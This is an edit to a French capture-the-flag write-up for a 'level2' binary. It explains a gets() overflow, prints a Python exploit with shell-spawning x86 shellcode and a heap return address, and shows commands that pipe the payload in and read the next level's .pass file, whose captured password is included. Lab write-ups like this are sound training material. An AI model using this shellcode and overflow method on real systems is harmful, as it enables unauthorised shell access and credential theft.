@@ -3,4 +3,28 @@ Je commence par desassembler le binaire level2 dans ghidra
 Il y a une fonction p() en plus de la fonction main()
 
 La fonction main fait seulement un appel a p() puis retourne
-La fonction p() 
+La fonction p()t l'entree standard avec gets() dans un buffer de 76. Il y a ensuite une condition, si ell eest verifiee le programme affiche l'adresse de unaf_retaddr entre parentheses et quite avec exit(), sinon le programme affiche le contenu du buffer avec puts() puis le duplique avec strdup().
+
+En recherchant je m'appercois que la condition sert a empecher d'ecrire sur la sauvegarde eip avec une adresse commencant par 'b', donc je ne peux pas utiliser la redirection par la sauvegarde eip sur ce niveau.
+
+Je pense qu'il faut que j'arrive a ecrire un shellcode qui lancera un shell dans la memoire du buffer alloue sur la heap pour qu'il puisse contourner la condition.
+
+Le script python est le suivant:
+
+#!/usr/bin/env python
+
+SHELLCODE = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+EBP = "BBBB"
+PREFIX = "A" * (76 - len(SHELLCODE))
+EIP = "\x08\xa0\x04\x08"
+
+print SHELLCODE + PREFIX + EBP + EIP
+
+
+$>chmod 777 .
+$>vim script.py
+$>chmod 777 script.py
+$>./script.py > out && cat out - | ./level2
+
+$ cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
